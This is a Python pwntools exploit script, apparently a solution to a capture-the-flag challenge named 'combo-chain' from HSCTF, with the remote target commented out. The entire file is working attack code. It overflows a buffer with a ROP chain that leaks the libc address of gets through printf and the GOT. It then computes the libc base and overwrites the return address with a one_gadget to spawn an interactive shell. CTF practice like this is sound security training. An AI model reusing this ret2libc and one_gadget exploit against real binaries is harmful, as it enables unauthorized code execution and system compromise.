from pwn import *
r = process('./combo-chain')
gdb.attach(r)
#r = remote('pwn.hsctf.com', 2345)
e = ELF('./combo-chain')
libc = e.libc

ru = lambda a: r.recvuntil(a)
sl = lambda a: r.sendline(a)
sa = lambda a, b: r.sendafter(a, b)
sla = lambda a, b: r.sendlineafter(a, b)
ex = lambda : r.interactive()

gets_offset = libc.symbols['gets']
gets_got = e.got['gets']
printf_plt = e.plt['printf']
main = e.symbols['main']
pr = 0x0000000000401263 # pop rdi; ret
nop = 0x000000000040114f
one_gadget = 0x4526a

p = ""
p += "\x90"*16
p += p64(pr)
p += p64(gets_got)
p += p64(nop)
p += p64(printf_plt)
p += p64(main)
sla(": ", p)

leaked = u64(r.recv(6).ljust(8, "\x00"))
print hex(leaked)
libc_base = leaked - gets_offset
one_shot = libc_base + one_gadget

p = ""
p += "\x90"*16
p += p64(one_shot)
sla(": ", p)
ex()

